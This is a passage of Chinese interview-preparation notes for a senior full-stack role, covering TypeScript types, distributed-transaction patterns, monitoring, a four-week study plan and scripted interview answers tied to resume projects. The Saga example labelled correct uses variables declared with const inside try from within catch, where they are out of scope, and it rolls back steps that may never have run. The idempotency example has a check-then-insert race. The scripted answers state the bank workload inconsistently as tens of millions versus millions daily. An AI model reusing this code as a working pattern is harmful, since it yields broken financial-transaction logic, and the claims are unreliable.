type User = { id: number; name: string; email: string };
type PartialUser = Partial<User>;
// { id?: number; name?: string; email?: string }

// Pick：选择部分属性
type UserPreview = Pick<User, 'id' | 'name'>;
// { id: number; name: string }

// Omit：排除部分属性
type UserWithoutEmail = Omit<User, 'email'>;
// { id: number; name: string }

// Record：创建对象类型
type UserMap = Record<string, User>;
// { [key: string]: User }
```

### 2. 条件类型（高级）

```typescript
// 提取Promise的返回类型
type UnwrapPromise<T> = T extends Promise<infer U> ? U : T;

type A = UnwrapPromise<Promise<string>>; // string
type B = UnwrapPromise<number>; // number

// 提取函数的参数类型
type GetParameters<T> = T extends (...args: infer P) => any ? P : never;

type Params = GetParameters<(a: string, b: number) => void>;
// [string, number]
```

### 3. 类型守卫（实战）

```typescript
// 类型收窄
function processValue(value: string | number) {
  if (typeof value === 'string') {
    return value.toUpperCase(); // TypeScript知道这里是string
  } else {
    return value.toFixed(2); // TypeScript知道这里是number
  }
}

// 自定义类型守卫
interface User { type: 'user'; name: string }
interface Admin { type: 'admin'; permissions: string[] }

function isAdmin(user: User | Admin): user is Admin {
  return user.type === 'admin';
}

function greet(user: User | Admin) {
  if (isAdmin(user)) {
    console.log(user.permissions); // TypeScript知道这里是Admin
  } else {
    console.log(user.name); // TypeScript知道这里是User
  }
}
```

---

## 🏗️ 分布式系统思维（P1核心能力）

### 1. CAP定理（架构必考）

| 属性 | 含义 | 取舍 |
|------|------|------|
| **C（一致性）** | 所有节点看到相同数据 | 金融系统优先 |
| **A（可用性）** | 系统始终响应请求 | 社交系统优先 |
| **P（分区容错）** | 网络分区时系统继续工作 | 必须保证 |

**面试话术**：
> "在OmniSettlement中，我选择了CP模式（一致性 + 分区容错）。因为金融场景下，宁可系统暂时不可用，也不能出现数据不一致。比如用户转账，如果主库和从库数据不一致，可能导致重复扣款。"

### 2. 分布式事务（Saga模式）

**场景**：用户下单 → 扣库存 → 扣款 → 发货

```typescript
// ❌ 错误：分布式环境下无法保证原子性
async function createOrder() {
  await inventoryService.deduct(); // 服务A
  await paymentService.charge();   // 服务B
  await shippingService.ship();    // 服务C
  // 如果服务C失败，服务A和B已经执行，无法回滚
}

// ✅ 正确：Saga补偿模式
async function createOrderSaga() {
  try {
    const inventoryId = await inventoryService.deduct();
    const paymentId = await paymentService.charge();
    const shippingId = await shippingService.ship();
    return { success: true };
  } catch (error) {
    // 补偿：逆序回滚
    await shippingService.cancel(shippingId);
    await paymentService.refund(paymentId);
    await inventoryService.restore(inventoryId);
    throw error;
  }
}
```

### 3. 幂等性设计（金融必备）

**核心原理**：同一个请求执行多次，结果与执行一次相同

```typescript
// ✅ 幂等性设计
async function transfer(
  from: string,
  to: string,
  amount: number,
  idempotencyKey: string // 唯一标识
) {
  // 1. 检查是否已执行
  const existing = await db.transaction.findUnique({
    where: { idempotencyKey }
  });
  
  if (existing) {
    return existing; // 重复请求直接返回
  }
  
  // 2. 执行业务逻辑
  const result = await db.$transaction(async (tx) => {
    // ... 转账逻辑
  });
  
  // 3. 记录执行结果
  return await db.transaction.create({
    data: { idempotencyKey, ...result }
  });
}
```

---

## 📊 监控与可观测性（P2加分项）

### 1. 三大支柱

| 支柱 | 工具 | 用途 |
|------|------|------|
| **日志（Logs）** | Winston、Pino | 记录业务事件 |
| **指标（Metrics）** | Prometheus | 监控系统性能 |
| **链路追踪（Traces）** | Jaeger、Zipkin | 分布式调用链 |

### 2. 关键指标（SRE必备）

```typescript
// 1. 错误率
const errorRate = errors / totalRequests;

// 2. 响应时间（P50/P95/P99）
const p95 = calculatePercentile(responseTimes, 0.95);

// 3. 吞吐量（QPS）
const qps = totalRequests / timeWindow;

// 4. 可用性（SLA）
const availability = uptime / (uptime + downtime);
```

### 3. 告警策略

```typescript
// ✅ 合理的告警阈值
if (errorRate > 0.01) { // 错误率 > 1%
  alert('高错误率');
}

if (p95ResponseTime > 1000) { // P95响应时间 > 1s
  alert('响应慢');
}

if (qps < 100) { // QPS突然下降
  alert('流量异常');
}
```

---

## 📅 四周"点杀"复习路线（第一性原理版 v3.6.14）


四周点杀 路线设计很合理 包括基础 框架 架构 算法 ^10bnry

### Week 1：JavaScript核心 + HTTP协议（基础夯实）


| 天数      | 主题                 | 核心考点                           | 简历对应               | 验收标准         |
| ------- | ------------------ | ------------------------------ | ------------------ | ------------ |
| Day 1-2 | **JavaScript异步机制** | Event Loop、Promise、async/await | Node.js高并发         | 能推导异步代码执行顺序  |
| Day 3   | **防抖节流（面试必考）**     | debounce、throttle手写实现          | 搜索框优化、滚动性能         | 必须手写         |
| Day 4-5 | **HTTP/网络协议**      | 缓存、HTTPS、WebSocket             | OmniSettlement实时推送 | 能画出HTTPS握手流程 |
| Day 6   | **安全专题**           | XSS、CSRF、SQL注入                 | 金融系统安全             | 能讲述防御方案      |
| Day 7   | **数据库事务与锁**        | 乐观锁、悲观锁、死锁                     | 光大银行高并发            | 能设计幂等性方案     |

**核心产出**：手写Promise并发控制器 + 手写防抖节流 + HTTPS握手流程图 + 幂等性设计方案

**必知必会补充**：
- 闭包与内存泄漏（必考）：能识别常见内存泄漏场景
- 原型链与继承（必考）：能手绘原型链图
- this绑定规则（必考）：能判断this指向     ^pu28kh



---

### Week 2：React性能 + Next.js缓存 + TypeScript（现代框架）

| 天数 | 主题 | 核心考点 | 简历对应 | 验收标准 |
|------|------|---------|---------|---------|
| Day 8-9 | **React性能优化** | 虚拟列表、useMemo、React.memo | OmniSettlement大数据渲染 | 能优化10000条数据渲染 |
| Day 10-11 | **Next.js缓存机制** | Data Cache、Router Cache、revalidate | 首屏600ms | 能画出缓存层级图 |
| Day 12-13 | **TypeScript类型体操** | 工具类型、条件类型、类型守卫 | 类型安全 | 能写复杂泛型 |
| Day 14 | **SSR/RSC/PPR** | Server Components、Suspense、Streaming | 实时数据看板 | 能解决Hydration Error |

**核心产出**：虚拟列表Demo + Next.js缓存配置 + TypeScript高级类型

**必知必会补充**：
- React Fiber架构（必考）：能解释时间切片原理
- Diff算法（必考）：能讲述key的作用
- 合成事件（必考）：能对比原生事件差异

---

### Week 3：分布式系统 + 监控 + AI协同（架构周）

| 天数 | 主题 | 核心考点 | 简历对应 | 验收标准 |
|------|------|---------|---------|---------|
| Day 15-16 | **分布式系统思维** | CAP定理、Saga模式、幂等性 | 12年架构经验 | 能设计分布式事务 |
| Day 17-18 | **监控与可观测性** | 日志、指标、链路追踪 | 生产问题排查 | 能设计告警策略 |
| Day 19-20 | **AI协同开发** | Cursor使用 + 代码审查 | 3个生产级项目 | 能讲述幂等性漏洞案例 |
| Day 21 | **Node.js深度** | Stream、Buffer、Cluster | 后端API开发 | 能设计高性能API |

**核心产出**：Saga补偿模式设计 + 监控大盘配置 + AI代码审查案例

**必知必会补充**：
- 消息队列（必考）：能对比RabbitMQ vs Kafka
- 缓存策略（必考）：能设计多级缓存
- 限流降级（必考）：能实现令牌桶算法

---

### Week 4：算法 + 系统设计 + 模拟面试（冲刺周）

| 天数 | 主题 | 核心考点 | 简历对应 | 验收标准 |
|------|------|---------|---------|---------|
| Day 22-23 | **算法必考题** | 数组、链表、树、动态规划 | 算法基础 | 能手写LeetCode Medium |
| Day 24-25 | **系统设计** | 短链接、秒杀、IM系统 | 架构设计能力 | 能画出完整架构图 |
| Day 26-27 | **项目复盘** | 3个STAR故事深化 | 实战经验 | 能流畅讲述30分钟 |
| Day 28 | **模拟面试** | 全流程演练 + 压力测试 | - | 自信且专业 |

**核心产出**：10道算法题 + 3个系统设计方案 + 完整面试话术

**必知必会补充**：
- 手写Promise.all/race/allSettled（必考）
- 手写深拷贝（考虑循环引用）
- 手写EventEmitter（发布订阅模式）
- 手写LRU缓存（必考）
- 手写快速排序/归并排序

---

## 🎯 面试"降维打击"话术模板

### 1. 开场自我介绍（60秒黄金时间）

> "您好，我是彭建初，有12年软件开发经验。前8年在金融行业做Java后端，负责过光大银行的核心交易系统，日均处理千万级流水。
> 
> 近4年转型全栈，深度使用React和Next.js。最近独立完成了3个生产级项目，都是用Cursor和AI协同开发，开发效率提升了3-5倍。
> 
> 我的核心优势是：用12年经验识别AI代码风险。AI能快速生成代码，但在金融场景的关键逻辑上，比如幂等性、事务控制，AI经常会有漏洞。我能在代码审查阶段快速发现并修复这些问题。
> 
> 这次应聘贵司的全栈岗位，希望能把我的金融经验和现代全栈技术结合起来，为团队创造价值。"

### 2. AI协同开发问题（2026必考）

**面试官问**："你如何看待AI对开发者的影响？"

**满分回答**：
> "AI是工具，不是替代品。我用Cursor独立完成了3个生产级项目，开发效率提升了3-5倍。但我的核心价值不是'用AI写得快'，而是'用12年经验审得准'。
> 
> 举个例子：在OmniSettlement项目中，AI生成的资金转账代码看起来很完美，但我立即发现了三个致命漏洞：没有事务、没有幂等性、没有余额检查。如果这段代码上线，用户网络抖动连点两次，就会扣两次钱。
> 
> 这种'防御性思维'是我12年金融经验的核心价值。AI能帮我快速搭建脚手架，但在关键决策上，比如选择乐观锁还是悲观锁、如何设计分布式事务补偿机制，这需要对业务场景的深刻理解，AI目前做不到。
> 
> 我的工作模式是：AI辅助 + 人工决策。用AI提升80%的开发效率，用12年经验保证100%的系统安全性。"

### 3. 为什么从Java转全栈？

**满分回答**：
> "这不是转行，而是技术栈的扩展。我在光大银行做了8年Java后端，对分布式系统、数据库事务、高并发有深刻理解。但我发现现代软件开发的趋势是全栈化，前后端界限越来越模糊。
> 
> Next.js的Server Actions让我可以在一个文件里写前端UI和后端逻辑，这种开发体验比传统的前后端分离高效太多。而且我的Java经验在全栈开发中是巨大优势：
> 
> 1. 我理解数据库事务，所以在写Prisma代码时，会自然地考虑幂等性和并发控制
> 2. 我理解JVM的GC，所以在写JavaScript时，会注意闭包内存泄漏
> 3. 我理解多线程，所以在写Event Loop代码时，会避免阻塞主线程
> 
> 这种'降维打击'的能力，是纯前端开发者很难具备的。"

### 4. Event Loop问题

**面试官问**："请说一下JavaScript的事件循环机制。"

**满分回答**：
> "以前在做Java开发时，我们解决并发靠的是多线程协作和锁机制。但JavaScript的第一性原理是**单线程非阻塞I/O**。
> 
> 它的事件循环分为宏任务和微任务。宏任务包括setTimeout、I/O，每轮Event Loop执行一个；微任务包括Promise.then，当前宏任务结束后立即清空所有微任务。
> 
> 执行顺序是：同步代码 → 清空微任务 → 执行一个宏任务 → 重复。
> 
> 这种机制的优势是：单线程避免了锁竞争，非阻塞I/O保证了高并发。但劣势是：CPU密集任务会阻塞Event Loop，导致所有请求卡死。所以在OmniSettlement项目中，我把加密计算放到Worker Threads处理，避免阻塞主线程。
> 
> 这种对比Java多线程的理解，让我能更深刻地把握JavaScript的并发模型。"

### 5. 项目难点问题

**面试官问**："说一个你遇到的最大技术难点。"

**满分回答（STAR法则）**：

**Situation（背景）**：
> "在OmniSettlement项目中，我负责实时数据看板。需求是：用户打开页面后，价格变动要在50ms内推送到前端，并且首屏加载时间不能超过600ms。"

**Task（任务）**：
> "这个需求的难点在于：既要保证SSR的首屏性能，又要保证WebSocket的实时性。如果用传统的CSR，首屏会白屏；如果用传统的SSR，服务端渲染的价格和客户端WebSocket推送的价格不一致，会导致Hydration Error。"

**Action（行动）**：
> "我的解决方案是：
> 1. 首屏用SSR渲染骨架屏，不渲染实时价格，避免水合错误
> 2. 客户端挂载后，立即建立WebSocket连接，订阅价格推送
> 3. 用React的Suspense包裹实时数据组件，实现Streaming渲染
> 4. 在Next.js配置中，对静态资源开启强缓存，对动态数据用协商缓存
> 
> 这样既保证了首屏600ms的性能指标，又保证了50ms的实时推送延迟。"

**Result（结果）**：
> "上线后，首屏加载时间稳定在500-600ms，实时推送延迟在30-50ms。用户反馈体验非常流畅。这个方案后来被团队推广到其他实时看板项目。"

---

## 📝 必背的STAR故事（3个）

### 故事1：AI生成代码的幂等性漏洞

**Situation**：在OmniSettlement项目中，我用Cursor生成资金转账接口  
**Task**：需要保证金融级的安全性和幂等性  
**Action**：发现AI代码缺少事务、幂等性、余额检查，手动补充防御逻辑  
**Result**：避免了重复扣款的生产事故，代码通过了安全审计

### 故事2：Hydration Error的排查与解决

**Situation**：OmniSettlement实时看板出现Hydration Error  
**Task**：需要在保证SSR性能的同时，避免水合错误  
**Action**：首屏用骨架屏，客户端挂载后再渲染实时数据  
**Result**：首屏600ms + 实时推送50ms，用户体验流畅

### 故事3：光大银行高并发优化

**Situation**：光大银行交易系统在促销活动时，QPS从1000飙升到10000，系统响应变慢  
**Task**：需要在不增加硬件的情况下，优化系统性能  
**Action**：引入Redis缓存 + 数据库读写分离 + 异步MQ削峰  
**Result**：QPS提升到15000，响应时间从2秒降到200ms

---

## 🚀 面试前一天检查清单

### 技术准备
- [ ] 能流畅讲述Event Loop执行顺序
- [ ] 能手写Promise并发控制器
- [ ] 能画出HTTPS握手流程图
- [ ] 能讲述Hydration Error的解决方案
- [ ] 能讲述AI代码审查的幂等性漏洞案例
- [ ] 能对比Java和JavaScript的并发模型

### 项目准备
- [ ] 背诵3个STAR故事（AI漏洞、Hydration Error、高并发优化）
- [ ] 准备OmniSettlement项目的技术架构图
- [ ] 准备光大银行项目的业务流程图

### 心态准备
- [ ] 自信：12年经验 + AI协同 = 降维打击
- [ ] 谦虚：承认不足，展示学习能力
- [ ] 真诚：不夸大，不隐瞒

---

## 💡 面试加分项

### 1. 展示GitHub/个人网站
- 准备一个Next.js的个人项目，展示SSR/RSC/PPR能力
- 代码质量要高，有完整的TypeScript类型定义
- 有单元测试和E2E测试

### 2. 展示学习能力
- 关注Next.js 15的最新特性（异步Params、PPR）
- 关注React 19的最新特性（Server Actions、use hook）
- 能讲述技术演进的底层逻辑

### 3. 展示业务理解
- 不只是技术实现，更要理解业务价值
- 能用ROI思维权衡技术方案
- 能站在产品和用户的角度思考问题

---

## 🎓 总结：第一性原理的学习方法

### 核心能力（必须掌握）
1. **JavaScript异步机制**：单线程非阻塞I/O的本质
2. **HTTP/网络协议**：前后端通信的基础
3. **数据库事务与锁**：数据一致性的保证
4. **安全**：生产系统的生命线
5. **React性能优化**：用户体验的关键
6. **Next.js缓存机制**：SSR性能的核心
7. **TypeScript类型体操**：类型安全的保障
8. **分布式系统思维**：架构师的必备素养

### 奇技淫巧（了解即可）
1. 防抖节流：工具库已实现
2. 高阶函数/柯里化：过度函数式编程
3. 原型链：ES6 Class已替代
4. 手写Promise：生产环境用原生

### 学习策略
- 70%时间学习核心能力
- 20%时间准备AI协同开发案例
- 10%时间了解奇技淫巧（应付面试题）

### 面试策略
- 用12年经验展示"防御性思维"
- 用AI协同展示"效率提升"
- 用Java对比展示"降维打击"
- 用STAR故事展示"实战能力"

**记住**：面试不是考试，而是展示你能为团队创造的价值。你的价值不是"会用AI"，而是"用12年经验审得准"。

---

## 📋 全部必考点列表（围绕简历项目）

> **使用说明**：每个必考点都对应简历中的具体项目，面试时可直接引用项目经验

### 一、OmniSettlement项目必考点（10个）

| 必考点 | 简历原文 | 面试关键词 |
|--------|---------|-----------|
| Next.js 15 App Router | "采用App Router + Server Actions" | 前后端一体化、首屏600ms |
| Server Components | "通过Server Components实现数据预取" | SSR优化、减少客户端JS |
| WebSocket实时推送 | "WebSocket推送行情数据" | 5000+并发、延迟50ms |
| React Query乐观更新 | "React Query实现乐观更新" | 用户操作立即响应 |
| 数据库事务 + 行级锁 | "乐观锁 + 行级锁机制" | 资金账户一致性、零脏数据 |
| 性能优化 | "首屏渲染优化至600ms" | 代码分割、ISR、Lighthouse 95+ |
| Redis原子计数 | "Redis原子计数实现计费" | 毫秒级计费、阶梯计费 |
| ECharts可视化 | "ECharts实现金融指标看板" | 实时K线、深度图 |
| Prisma ORM | "Prisma ORM管理数据库交互" | 类型安全、自动迁移 |
| AI辅助开发 | "使用Cursor进行快速原型开发" | 识别幂等性漏洞、防御性思维 |

### 二、光大银行项目必考点（8个）

| 必考点 | 简历原文 | 面试关键词 |
|--------|---------|-----------|
| SQL优化 | "核心查询从3秒优化至200ms" | 索引重构、分区表、性能提升15倍 |
| JVM调优 | "jmap/jstack定位ThreadLocal内存泄漏" | FGC停顿、内存泄漏排查 |
| 分布式事务 | "TCC模式的分布式事务补偿" | 最终一致性、资金流转 |
| 异常处理 + 链路追踪 | "统一异常处理与链路追踪" | 端到端问题定位 |
| 高并发 | "支撑日均百万级交易量" | 读写分离、Redis缓存、MQ削峰 |
| 对账系统 | "对账准确率99.999%" | 双向对账、差错处理 |
| 幂等性设计 | "确保资金流转一致性" | 幂等性、空回滚、悬挂处理 |
| AI代码审查 | "识别并修复幂等性漏洞" | 避免资金风险、防御性思维 |

### 三、凌动SaaS项目必考点（8个）

| 必考点 | 简历原文 | 面试关键词 |
|--------|---------|-----------|
| React迁移Next.js | "从传统React迁移至Next.js 15" | 开发效率提升50% |
| 微前端 | "Module Federation实现微前端" | 多子系统独立开发部署 |
| 状态管理 | "Zustand替代Redux" | 代码量减少40% |
| CI/CD | "GitHub Actions自动化部署" | 多环境发布、回滚 |
| 性能优化 | "产物体积减小70%" | Webpack分析、Tree-shaking |
| WebSocket | "WebSocket实现实时监控" | 降低服务器负载40% |
| 大文件上传 | "Web Worker分片上传" | G级数据、断点续传 |
| AI辅助重构 | "使用Cursor进行代码重构" | 代码量减少40%、保证质量 |

### 四、通用必考点（不对应具体项目）

| 必考点 | 考察频率 | 面试关键词 |
|--------|---------|-----------|
| JavaScript异步机制 | ⭐⭐⭐⭐⭐ | Event Loop、Promise、async/await |
| HTTP/网络协议 | ⭐⭐⭐⭐⭐ | HTTPS握手、缓存机制、WebSocket |
| React性能优化 | ⭐⭐⭐⭐ | 虚拟列表、useMemo、React.memo |
| TypeScript类型体操 | ⭐⭐⭐⭐ | 工具类型、条件类型、泛型 |
| 安全 | ⭐⭐⭐⭐⭐ | XSS、CSRF、SQL注入 |
| 防抖节流 | ⭐⭐⭐⭐⭐ | 手写实现（面试必考） |
| 监控与可观测性 | ⭐⭐⭐ | 日志、指标、链路追踪 |

### 五、快速对应表

**面试官问技术点 → 立即对应到简历项目**

```
Next.js/SSR → OmniSettlement首屏600ms优化
WebSocket → OmniSettlement实时推送 + 凌动实时监控
性能优化 → OmniSettlement 600ms + 凌动70%体积优化
SQL优化 → 光大银行3秒→200ms
分布式事务 → 光大银行TCC模式
幂等性 → OmniSettlement资金一致性 + 光大银行AI漏洞
微前端 → 凌动Module Federation
AI协同 → 所有3个项目的AI辅助开发经验
```

### 六、面试使用技巧

1. **听到技术点 → 立即对应项目**：面试官问"你做过性能优化吗？"，立即回答"在OmniSettlement项目中，我将首屏优化到600ms..."

2. **用数字说话**：600ms、200ms、70%、50%、5000+并发、99.999%准确率

3. **STAR法则展开**：每个必考点都能用Situation、Task、Action、Result展开成15分钟故事

4. **强调AI差异化**：不是"用AI写得快"，而是"用12年经验审得准"

---

## 🎯 黄金4周必考（围绕简历版）

> **核心原则**：每个必考点都必须能对应到简历中的具体项目经验，面试时能用STAR法则讲述  
> **简历版本**：基于资深全栈v3.6.11.2026.md

### Week 1：OmniSettlement项目核心技术（独立开发项目）

**简历项目**：OmniSettlement - 全域资产清算与量化交易平台

| 天数 | 必考点 | 简历对应 | 面试话术 | 验收标准 |
|------|--------|---------|---------|---------|
| **Day 1** | **Next.js 15 App Router** | "采用App Router + Server Actions" | "我用App Router实现前后端一体化，首屏600ms" | 能画出App Router架构图 |
| **Day 2** | **Server Actions** | "Server Actions处理业务逻辑" | "Server Actions让我在一个文件里写前后端逻辑" | 能写出完整的Server Action |
| **Day 3** | **WebSocket实时推送** | "WebSocket推送行情数据" | "支持5000+并发连接，延迟50ms" | 能设计WebSocket架构 |
| **Day 4** | **React Query乐观更新** | "React Query实现乐观更新" | "用户操作立即响应，体验流畅无感知" | 能实现乐观更新 |
| **Day 5** | **数据库事务 + 行级锁** | "乐观锁 + 行级锁机制" | "确保资金账户绝对一致性，零脏数据" | 能设计幂等性方案 |
| **Day 6** | **性能优化（600ms首屏）** | "首屏渲染优化至600ms" | "代码分割、动态导入、ISR增量生成" | Lighthouse 95+ |
| **Day 7** | **Redis原子计数** | "Redis原子计数实现计费" | "毫秒级API调用计费，支持阶梯计费" | 能设计计费引擎 |

**核心产出**：
- 能用STAR法则讲述"首屏600ms优化"故事（15分钟）
- 能画出OmniSettlement完整技术架构图
- 能讲述"幂等性设计"的防御性思维

---

### Week 2：光大银行项目核心技术（金融级系统）

**简历项目**：光大银行核心结算系统（驻场研发）

| 天数 | 必考点 | 简历对应 | 面试话术 | 验收标准 |
|------|--------|---------|---------|---------|
| **Day 8** | **SQL优化（3秒→200ms）** | "核心查询从3秒优化至200ms" | "索引重构 + 分区表 + 慢查询分析" | 能写出优化方案 |
| **Day 9** | **JVM调优** | "jmap/jstack定位ThreadLocal内存泄漏" | "解决生产环境FGC停顿问题" | 能讲述调优过程 |
| **Day 10** | **分布式事务（TCC）** | "TCC模式的分布式事务补偿" | "保障跨系统资金流转的最终一致性" | 能设计TCC方案 |
| **Day 11** | **异常处理 + 链路追踪** | "统一异常处理与链路追踪" | "端到端问题快速定位" | 能设计监控体系 |
| **Day 12** | **高并发（千万级流水）** | "支撑日均百万级交易量" | "读写分离 + Redis缓存 + MQ削峰" | 能设计高并发方案 |
| **Day 13** | **对账准确率99.999%** | "对账准确率达到99.999%" | "双向对账 + 差错处理 + 补偿机制" | 能设计对账系统 |
| **Day 14** | **金融安全（幂等性）** | "确保资金流转的最终一致性" | "幂等性 + 空回滚 + 悬挂处理" | 能讲述防御性思维 |

**核心产出**：
- 能用STAR法则讲述"SQL优化15倍"故事（15分钟）
- 能画出分布式事务TCC流程图
- 能讲述"ThreadLocal内存泄漏"排查过程

---

### Week 3：凌动SaaS项目核心技术（架构升级）

**简历项目**：凌动工业SaaS平台 - 技术架构升级

| 天数 | 必考点 | 简历对应 | 面试话术 | 验收标准 |
|------|--------|---------|---------|---------|
| **Day 15** | **React迁移Next.js** | "从传统React迁移至Next.js 15" | "开发效率提升50%，首屏加载提升50%" | 能讲述迁移方案 |
| **Day 16** | **微前端（Module Federation）** | "Module Federation实现微前端" | "多子系统独立开发与部署" | 能设计微前端架构 |
| **Day 17** | **状态管理（Zustand）** | "Zustand替代Redux" | "代码量减少40%，性能提升明显" | 能对比状态管理方案 |
| **Day 18** | **CI/CD流水线** | "GitHub Actions自动化部署" | "多环境发布、环境隔离、项目回滚" | 能搭建CI/CD |
| **Day 19** | **性能优化（70%体积）** | "产物体积减小70%" | "Webpack分析、Tree-shaking、CDN" | 能做Bundle分析 |
| **Day 20** | **WebSocket替代轮询** | "WebSocket实现实时监控" | "降低服务器负载40%" | 能设计实时通信 |
| **Day 21** | **大文件上传** | "Web Worker分片上传" | "支持G级数据在弱网环境传输" | 能实现断点续传 |

**核心产出**：
- 能用STAR法则讲述"架构升级50%效率"故事（15分钟）
- 能画出微前端架构图
- 能讲述"性能优化70%"的具体方案

---

### Week 4：AI协同开发 + 跨项目通用能力（差异化）

**简历项目**：所有项目的AI协同开发经验

| 天数 | 必考点 | 简历对应 | 面试话术 | 验收标准 |
|------|--------|---------|---------|---------|
| **Day 22** | **AI辅助开发（Cursor）** | "使用Cursor进行快速原型开发" | "开发效率提升3-5倍" | 能讲述AI使用经验 |
| **Day 23** | **AI代码审查（幂等性漏洞）** | "识别并修复幂等性处理漏洞" | "避免潜在的资金风险" | 能讲述漏洞案例 |
| **Day 24** | **防御性思维（12年经验）** | "12年沉淀的防御性思维" | "识别AI生成代码中的金融风险漏洞" | 能讲述差异化优势 |
| **Day 25** | **JavaScript异步机制** | "Node.js微服务 + 高并发处理" | "Event Loop、Promise、async/await" | 能推导执行顺序 |
| **Day 26** | **HTTP/网络协议** | "WebSocket实时推送 + SSR优化" | "HTTPS握手、缓存机制、WebSocket" | 能画出握手流程 |
| **Day 27** | **React性能优化** | "虚拟列表、useMemo、React.memo" | "10000条数据流畅渲染" | 能优化长列表 |
| **Day 28** | **模拟面试** | 全流程演练 + 压力测试 | 自信且专业 | 流畅讲述30分钟 |

**核心产出**：
- 能用STAR法则讲述"AI幂等性漏洞"故事（15分钟）
- 能讲述"12年经验的差异化优势"
- 能流畅完成30分钟技术面试

---

## 📋 全部必考点列表（与简历对应）


资深全栈全部考点基于我们的简历



### 一、OmniSettlement项目必考点（独立开发）

| 必考点                       | 简历原文                            | 面试话术               | 技术深度           |
| ------------------------- | ------------------------------- | ------------------ | -------------- |
| **Next.js 15 App Router** | "采用App Router + Server Actions" | "前后端一体化开发，首屏600ms" | 能画架构图          |
| **Server Components**     | "通过Server Components实现数据预取"     | "服务端渲染，减少客户端JS"    | 能讲述RSC原理       |
| **WebSocket实时推送**         | "WebSocket推送行情数据"               | "5000+并发，延迟50ms"   | 能设计架构          |
| **React Query**           | "React Query实现乐观更新"             | "用户操作立即响应"         | 能实现乐观更新        |
| **数据库事务**                 | "乐观锁 + 行级锁机制"                   | "资金账户绝对一致性"        | 能设计幂等性         |
| **性能优化**                  | "首屏渲染优化至600ms"                  | "代码分割、ISR、图片优化"    | Lighthouse 95+ |
| **Redis原子计数**             | "Redis原子计数实现计费"                 | "毫秒级计费，阶梯计费"       | 能设计计费引擎        |
| **ECharts可视化**            | "ECharts实现金融指标看板"               | "实时K线、深度图"         | 能实现复杂图表        |
| **Prisma ORM**            | "Prisma ORM管理数据库交互"             | "类型安全、自动迁移"        | 能设计数据模型        |
| **TypeScript**            | "TypeScript + Tailwind CSS"     | "类型安全、开发效率"        | 能写复杂泛型         |
^7vvqks
---

### 二、光大银行项目必考点（金融级系统）

| 必考点 | 简历原文 | 面试话术 | 技术深度 |
|--------|---------|---------|---------|
| **SQL优化** | "核心查询从3秒优化至200ms" | "索引重构、分区表、慢查询" | 能写优化方案 |
| **JVM调优** | "jmap/jstack定位内存泄漏" | "解决FGC停顿问题" | 能讲述调优过程 |
| **分布式事务** | "TCC模式的分布式事务补偿" | "最终一致性保障" | 能设计TCC方案 |
| **异常处理** | "统一异常处理与链路追踪" | "端到端问题定位" | 能设计监控体系 |
| **高并发** | "支撑日均百万级交易量" | "读写分离、Redis、MQ" | 能设计高并发方案 |
| **对账系统** | "对账准确率99.999%" | "双向对账、差错处理" | 能设计对账系统 |
| **幂等性** | "确保资金流转一致性" | "幂等性、空回滚、悬挂" | 能讲述防御性思维 |
| **Spring Boot** | "Java Spring Cloud核心结算" | "微服务架构、服务治理" | 能设计微服务 |

---

### 三、凌动SaaS项目必考点（架构升级）

| 必考点 | 简历原文 | 面试话术 | 技术深度 |
|--------|---------|---------|---------|
| **React迁移** | "从React迁移至Next.js 15" | "开发效率提升50%" | 能讲述迁移方案 |
| **微前端** | "Module Federation微前端" | "多子系统独立开发" | 能设计微前端 |
| **状态管理** | "Zustand替代Redux" | "代码量减少40%" | 能对比方案 |
| **CI/CD** | "GitHub Actions自动化部署" | "多环境发布、回滚" | 能搭建CI/CD |
| **性能优化** | "产物体积减小70%" | "Webpack、Tree-shaking" | 能做Bundle分析 |
| **WebSocket** | "WebSocket实时监控" | "降低负载40%" | 能设计实时通信 |
| **大文件上传** | "Web Worker分片上传" | "G级数据弱网传输" | 能实现断点续传 |
| **团队建设** | "培养3名初级开发" | "代码规范、组件库" | 能讲述管理经验 |

---

### 四、AI协同开发必考点（差异化优势）

| 必考点 | 简历原文 | 面试话术 | 技术深度 |
|--------|---------|---------|---------|
| **Cursor使用** | "使用Cursor进行快速原型开发" | "开发效率提升3-5倍" | 能讲述使用经验 |
| **代码审查** | "识别并修复幂等性漏洞" | "避免潜在资金风险" | 能讲述漏洞案例 |
| **防御性思维** | "12年沉淀的防御性思维" | "识别AI代码风险" | 能讲述差异化 |
| **AI局限性** | "AI无法模拟的防御性思维" | "幂等性、空回滚、悬挂" | 能讲述AI不足 |
| **混合开发** | "AI辅助 + 人工决策" | "效率 + 安全性" | 能讲述工作模式 |

---

### 五、跨项目通用必考点（基础能力）

| 必考点              | 简历对应                     | 面试话术                 | 技术深度    |
| ---------------- | ------------------------ | -------------------- | ------- |
| **JavaScript异步** | "Node.js微服务 + 高并发"       | "Event Loop、Promise" | 能推导执行顺序 |
| **HTTP协议**       | "WebSocket + SSR优化"      | "HTTPS握手、缓存"         | 能画握手流程  |
| **React性能**      | "虚拟列表、useMemo"           | "10000条数据渲染"         | 能优化长列表  |
| **TypeScript**   | "类型安全、开发效率"              | "工具类型、泛型"            | 能写复杂类型  |
| **数据库**          | "PostgreSQL、MySQL、Redis" | "事务、索引、缓存"           | 能设计数据模型 |
| **安全**           | "金融级安全性"                 | "XSS、CSRF、SQL注入"     | 能讲述防御方案 |
| **监控**           | "端到端问题定位"                | "日志、指标、链路"           | 能设计监控体系 |

---

## 🎯 必考点与简历项目对应表

### OmniSettlement（独立开发）→ 10个必考点

```
Next.js 15 App Router ────→ "采用App Router + Server Actions"
Server Components ────────→ "通过Server Components实现数据预取"
WebSocket实时推送 ────────→ "WebSocket推送行情数据，5000+并发"
React Query乐观更新 ─────→ "React Query实现乐观更新"
数据库事务 + 行级锁 ─────→ "乐观锁 + 行级锁机制，零脏数据"
性能优化（600ms首屏）───→ "首屏渲染优化至600ms"
Redis原子计数 ───────────→ "Redis原子计数实现毫秒级计费"
ECharts可视化 ───────────→ "ECharts实现复杂金融指标看板"
Prisma ORM ──────────────→ "Prisma ORM管理数据库交互"
TypeScript ──────────────→ "TypeScript + Tailwind CSS"
```

### 光大银行（金融级系统）→ 8个必考点

```
SQL优化（3秒→200ms）────→ "核心查询从3秒优化至200ms"
JVM调优 ─────────────────→ "jmap/jstack定位ThreadLocal内存泄漏"
分布式事务（TCC）────────→ "TCC模式的分布式事务补偿机制"
异常处理 + 链路追踪 ─────→ "统一异常处理与链路追踪机制"
高并发（千万级流水）─────→ "支撑日均百万级交易量"
对账准确率99.999% ───────→ "对账准确率达到99.999%"
幂等性设计 ──────────────→ "确保资金流转的最终一致性"
